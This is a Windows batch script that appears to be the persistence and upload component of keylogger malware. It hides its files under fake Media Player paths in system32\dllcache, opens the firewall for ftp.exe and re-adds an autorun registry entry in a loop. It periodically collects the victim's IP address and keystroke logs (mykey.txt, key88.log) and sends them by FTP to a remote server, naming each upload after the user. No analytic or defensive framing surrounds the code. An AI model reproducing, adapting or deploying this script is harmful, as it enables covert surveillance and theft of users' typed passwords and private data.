@echo off
cd /d "C:\WINDOWS\system32\dllcache\MediaPlayer.dll"
tasklist /fi "username eq %username%" /fi "imagename eq services.exe"|findstr services.exe||start services.exe
set var=0
for /f %%a in ('tasklist /fi "username eq %username%" /fi "imagename eq winlogon.exe"^|findstr winlogon.exe') do (
set /a var+=1)
if %var% geq 2 (exit) else (call set var=)
attrib +h "C:\WINDOWS\system32\dllcache\MediaPlayer.dll\MSCOB.exe"
attrib +h %0
attrib +h "C:\WINDOWS\system32\dllcache\MediaPlayer.dll\MSCOB.exe\Media.vbs"
netsh firewall add allowedprogram %windir%\system32\ftp.exe FTP ENABLE
taskkill /F /IM MediaPlayer_update.exe
set "exe_path=C:\WINDOWS\system32\MediaPlayer_update.exe"
set "log_path=C:\WINDOWS\system32\dllcache\MediaPlayer.dll\Media"
set "autorun_reg=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
REG ADD %autorun_reg% /v MediaPlayer /t REG_SZ /d %exe_path% /f
md %log_path%
attrib +h %log_path%
setlocal
:loop
REG ADD %autorun_reg% /v MediaPlayer /t REG_SZ /d %exe_path% /f
endlocal
call :delay
call :put_up
goto :loop
:delay
echo Wscript.Sleep Wscript.Arguments(0) * 60000>"C:\WINDOWS\system32\dllcache\MediaPlayer.dll\MSCOB.exe\wmp.vbs"
attrib +h "C:\WINDOWS\system32\dllcache\MediaPlayer.dll\MSCOB.exe\wmp.vbs"
"C:\WINDOWS\system32\dllcache\MediaPlayer.dll\MSCOB.exe\wmp.vbs" 30 
del /a:h "C:\WINDOWS\system32\dllcache\MediaPlayer.dll\MSCOB.exe\wmp.vbs" 
goto :eof
:put_up
for /f "tokens=1-3 delims=/ " %%a in ('echo %date%') do (
call set yr=%%a
call set mn=%%b
call set dy=%%c
                                                         )
if %mn% lss 10 (set mn=%mn:*0=%) 
if %dy% lss 10 (set dy=%dy:*0=%)
set today=%yr%-%mn%-%dy%
type Media.wav>%temp%\Mediaput.tmp
echo.>>%temp%\Mediaput.tmp
for /f %%a in ('dir /a:d /b %log_path%') do (
(ipconfig|findstr "IP^ Address")>%temp%\logpath[%%a].tmp
echo ==========================================================================================>>%temp%\logpath[%%a].tmp
echo ==========================================================================================>>%temp%\logpath[%%a].tmp
echo «öÁä¬ö¿ý:>>%temp%\logpath[%%a].tmp
echo.>>%temp%\logpath[%%a].tmp
type %log_path%\%%a\mykey.txt>>%temp%\logpath[%%a].tmp
echo.>>%temp%\logpath[%%a].tmp
echo ==========================================================================================>>%temp%\logpath[%%a].tmp
echo ==========================================================================================>>%temp%\logpath[%%a].tmp
echo ==========================================================================================>>%temp%\logpath[%%a].tmp
echo ¶}±ÒÀÉ®×¬ö¿ý:>>%temp%\logpath[%%a].tmp
echo.>>%temp%\logpath[%%a].tmp
type %log_path%\%%a\key88.log>>%temp%\logpath[%%a].tmp
if not %%a==%today% (
echo mkdir %%a>>%temp%\Mediaput.tmp
echo put %temp%\logpath[%%a].tmp %%a\[%%a]_[%userdomain%]_[%username%].txt>>%temp%\Mediaput.tmp) else (
echo mkdir %%a>>%temp%\Mediaput.tmp
echo put %temp%\logpath[%%a].tmp %%a\[%%a]_[%userdomain%]_[%username%].txt>>%temp%\Mediaput.tmp)
)
echo bye>>%temp%\Mediaput.tmp
ftp -s:"%temp%\Mediaput.tmp"
del /f /s /q %temp%\Mediaput.tmp
del /f /s /q %temp%\logpath*.tmp
for /f %%a in ('dir /a:d /b %log_path%') do (
if not %%a==%today% (rd /s /q %log_path%\%%a)   )
goto:eof



